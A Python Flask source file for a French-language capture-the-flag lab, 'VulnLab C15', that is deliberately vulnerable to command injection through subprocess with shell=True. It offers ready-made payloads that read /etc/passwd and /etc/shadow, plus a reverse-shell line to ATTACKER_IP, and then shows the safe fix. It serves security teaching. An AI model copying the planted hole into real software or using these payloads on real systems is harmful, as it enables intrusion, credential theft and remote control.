# VulnLab C15 — Command Injection
# VULNÉRABILITÉ : input utilisateur concaténé dans une commande shell via subprocess shell=True
from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

PAGE = '''<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>NetDiag — Outils réseau</title>
<style>*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#c8d0dc;min-height:100vh;padding:40px 24px}
.wrap{max-width:820px;margin:0 auto}
h1{font-size:22px;color:#e4e8f0;margin-bottom:6px}
.sub{font-size:13px;color:#5a6475;font-family:monospace;margin-bottom:28px}
.card{background:#151a22;border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:22px;margin-bottom:16px}
.card h3{font-size:13px;font-weight:600;text-transform:uppercase;letter-spacing:.08em;color:#5a6475;margin-bottom:14px}
.tool-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
.tool-btn{padding:10px;background:#1e2636;border:1px solid rgba(255,255,255,.08);border-radius:8px;
  font-size:12px;font-family:monospace;color:#89dceb;cursor:pointer;text-align:center;
  transition:background .15s,border-color .15s}
.tool-btn:hover,.tool-btn.active{background:#2a3650;border-color:#4a9eff}
.input-row{display:flex;gap:10px;margin-bottom:14px}
input[type=text]{flex:1;padding:10px 14px;background:#0f1117;border:1px solid rgba(255,255,255,.1);
  border-radius:8px;font-size:14px;font-family:monospace;color:#e4e8f0;outline:none}
input:focus{border-color:#4a9eff}
.btn{padding:10px 20px;background:#2d6ef7;color:#fff;border:none;border-radius:8px;
  font-size:13px;font-weight:600;cursor:pointer;white-space:nowrap}
.terminal{background:#0a0c0f;border:1px solid rgba(255,255,255,.08);border-radius:8px;
  padding:16px;font-family:monospace;font-size:12px;color:#a6e3a1;line-height:1.8;
  min-height:120px;max-height:400px;overflow-y:auto;white-space:pre-wrap;word-break:break-all}
.terminal-header{display:flex;align-items:center;gap:8px;margin-bottom:10px}
.dot{width:10px;height:10px;border-radius:50%}
.d-red{background:#e84a4a}.d-amber{background:#e8a820}.d-green{background:#5db84a}
.cmd-echo{color:#6c7086;margin-bottom:8px}
.flag-line{color:#86efac;font-weight:700}
.warn{background:#1a1200;border:1px solid rgba(232,168,32,.3);border-radius:8px;
  padding:10px 14px;font-size:12px;color:#e8a820;font-family:monospace;margin-bottom:14px}
a{color:#4a9eff;font-size:13px;text-decoration:none}
.quick{display:flex;flex-wrap:wrap;gap:8px;margin-top:12px}
.qbtn{padding:4px 12px;background:#1e2636;border:1px solid rgba(255,255,255,.08);border-radius:6px;
  font-size:11px;font-family:monospace;color:#cba6f7;cursor:pointer}
.qbtn:hover{background:#2a3650}
</style></head><body><div class="wrap">
<h1>NetDiag — Outils de diagnostic réseau</h1>
<p class="sub">Panneau d'administration · Outils système internes</p>

<div class="card">
  <h3>Sélectionner un outil</h3>
  <div class="tool-grid">
    <div class="tool-btn active" onclick="setTool('ping')">📡 ping</div>
    <div class="tool-btn" onclick="setTool('nslookup')">🔍 nslookup</div>
    <div class="tool-btn" onclick="setTool('traceroute')">🗺 traceroute</div>
  </div>
  <div class="warn">⚠ L'input est passé directement à subprocess avec shell=True — injection possible</div>
  <form method="POST" action="run">
    <input type="hidden" name="tool" id="tool" value="ping">
    <div class="input-row">
      <input type="text" name="target" id="target"
             placeholder="ex: 127.0.0.1"
             value="{{ target or '' }}">
      <button type="submit" class="btn">▶ Exécuter</button>
    </div>
  </form>
  <div class="quick">
    <span style="font-size:11px;color:#5a6475;align-self:center">Payloads :</span>
    <span class="qbtn" onclick="inject('; id')">; id</span>
    <span class="qbtn" onclick="inject('| whoami')">| whoami</span>
    <span class="qbtn" onclick="inject('&& cat /flag.txt')">&amp;&amp; cat /flag.txt</span>
    <span class="qbtn" onclick="inject('`cat /flag.txt`')">`cat /flag.txt`</span>
    <span class="qbtn" onclick="inject('$(cat /etc/passwd)')">$(cat /etc/passwd)</span>
  </div>
</div>

{% if output is not none %}
<div class="card">
  <h3>Résultat</h3>
  <div class="terminal">
    <div class="terminal-header">
      <div class="dot d-red"></div><div class="dot d-amber"></div><div class="dot d-green"></div>
      <span style="font-size:11px;color:#5a6475;margin-left:6px">root@netdiag:~#</span>
    </div>
    <div class="cmd-echo">$ {{ cmd }}</div>
    {% for line in output %}
      {% if 'FLAG{' in line %}
      <div class="flag-line">{{ line }}</div>
      {% else %}
      {{ line }}
      {% endif %}
    {% endfor %}
  </div>
</div>
{% endif %}

{% if flag_found %}
<div style="background:linear-gradient(135deg,#0f2a0f,#1a4a1a);border:1px solid #2d6b2d;border-radius:10px;padding:18px 20px;display:flex;align-items:center;gap:14px;margin-bottom:16px">
  <div style="font-size:26px">🚩</div>
  <div>
    <div style="font-size:10px;color:#6dbf6d;text-transform:uppercase;letter-spacing:.1em;margin-bottom:4px">C15 — Flag capturé !</div>
    <div style="font-family:monospace;font-size:15px;color:#86efac;font-weight:700">FLAG{cmd_1nj3ct10n_0s_syst3m_pwn3d}</div>
  </div>
</div>
{% endif %}

<a href="hints">Hints &amp; Write-up →</a>
</div>

<script>
function setTool(t) {
  document.getElementById('tool').value = t;
  document.querySelectorAll('.tool-btn').forEach(b => b.classList.remove('active'));
  event.target.classList.add('active');
  const placeholders = {ping:'127.0.0.1', nslookup:'example.com', traceroute:'8.8.8.8'};
  document.getElementById('target').placeholder = 'ex: ' + placeholders[t];
}
function inject(payload) {
  document.getElementById('target').value = '127.0.0.1' + payload;
}
</script>
</body></html>'''

HINTS = '''<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"><title>C15 Hints</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#c8d0dc;padding:40px 24px}
.wrap{max-width:720px;margin:0 auto}h1{font-size:22px;color:#e4e8f0;margin-bottom:8px}
.sub{font-size:13px;color:#5a6475;font-family:monospace;margin-bottom:28px}
.hint{background:#151a22;border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:18px;margin-bottom:12px}
.lbl{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:.08em;margin-bottom:8px}
.l1{color:#16a34a}.l2{color:#d97706}.l3{color:#dc2626}
p{font-size:14px;color:#8a94a6;line-height:1.7;margin-bottom:8px}
.code{background:#1e1e2e;border-radius:8px;padding:12px;font-family:monospace;font-size:12px;
  color:#cdd6f4;line-height:1.8;margin:8px 0;white-space:pre;overflow-x:auto}
a{color:#4a9eff}</style></head><body>
<div class="wrap">
<a href="/" style="font-size:13px;color:#4a9eff;display:block;margin-bottom:20px">← Retour</a>
<h1>C15 — Command Injection</h1>
<p class="sub">Python 3 · Flask · subprocess shell=True</p>

<div class="hint"><div class="lbl l1">Indice 1 — Comprendre la vulnérabilité</div>
<p>Le serveur exécute : <code>ping -c 1 [INPUT]</code> avec <code>shell=True</code>.
L'input est concaténé directement dans la commande sans échappement.
Les séparateurs shell permettent d'enchaîner une deuxième commande.</p></div>

<div class="hint"><div class="lbl l2">Indice 2 — Opérateurs d'injection shell</div>
<div class="code"># Séparateur simple — exécute les deux commandes
127.0.0.1; id
127.0.0.1; cat /flag.txt

# Pipe — redirige la sortie
127.0.0.1 | whoami

# ET logique — exécute si ping réussit
127.0.0.1 && cat /flag.txt

# Substitution de commande
127.0.0.1 `cat /flag.txt`
127.0.0.1 $(ls -la /)</div></div>

<div class="hint"><div class="lbl l3">Indice 3 — Escalade</div>
<div class="code"># Lire des fichiers sensibles
127.0.0.1; cat /etc/passwd
127.0.0.1; cat /etc/shadow
127.0.0.1; env

# Reverse shell (si port accessible)
127.0.0.1; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Via curl
curl -X POST http://localhost/c15/run \\
  -d "tool=ping&target=127.0.0.1;+cat+/flag.txt"</div></div>

<div class="hint"><div class="lbl l3">Correction</div>
<div class="code"># ✅ Ne jamais utiliser shell=True avec de l'input utilisateur
# Utiliser une liste d'arguments — aucune injection possible
import subprocess, shlex

# ❌ Vulnérable
subprocess.run(f"ping -c 1 {target}", shell=True)

# ✅ Sécurisé — l'input est un argument, pas du shell
result = subprocess.run(
    ["ping", "-c", "1", target],
    capture_output=True, text=True, timeout=5
)

# ✅ Aussi : valider l'input (IP ou hostname uniquement)
import re
if not re.match(r'^[a-zA-Z0-9.\-]+$', target):
    abort(400)</div></div>

<p>FLAG : <span style="font-family:monospace;color:#86efac">FLAG{cmd_1nj3ct10n_0s_syst3m_pwn3d}</span></p>
</div></body></html>'''

TOOLS = {
    'ping':       'ping -c 2 {}',
    'nslookup':   'nslookup {}',
    'traceroute': 'traceroute -m 5 {}',
}

@app.route('/', methods=['GET'])
def index():
    return render_template_string(PAGE, output=None, cmd=None, target=None, flag_found=False)

@app.route('/run', methods=['POST'])
def run():
    tool   = request.form.get('tool',   'ping')
    target = request.form.get('target', '').strip()

    if not target:
        return render_template_string(PAGE, output=['Cible manquante.'], cmd='', target='', flag_found=False)

    template = TOOLS.get(tool, 'ping -c 2 {}')
    # ⚠️  VULNÉRABILITÉ INTENTIONNELLE : shell=True + concaténation directe
    cmd = template.format(target)

    try:
        result = subprocess.run(
            cmd, shell=True,
            capture_output=True, text=True, timeout=10
        )
        raw    = (result.stdout + result.stderr).strip()
        output = raw.splitlines() if raw else ['(pas de sortie)']
    except subprocess.TimeoutExpired:
        output = ['Timeout — commande trop longue.']
    except Exception as e:
        output = [f'Erreur : {e}']

    flag_found = any('FLAG{' in line for line in output)
    return render_template_string(PAGE,
        output=output, cmd=cmd, target=target, flag_found=flag_found)

@app.route('/hints')
def hints():
    return render_template_string(HINTS)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
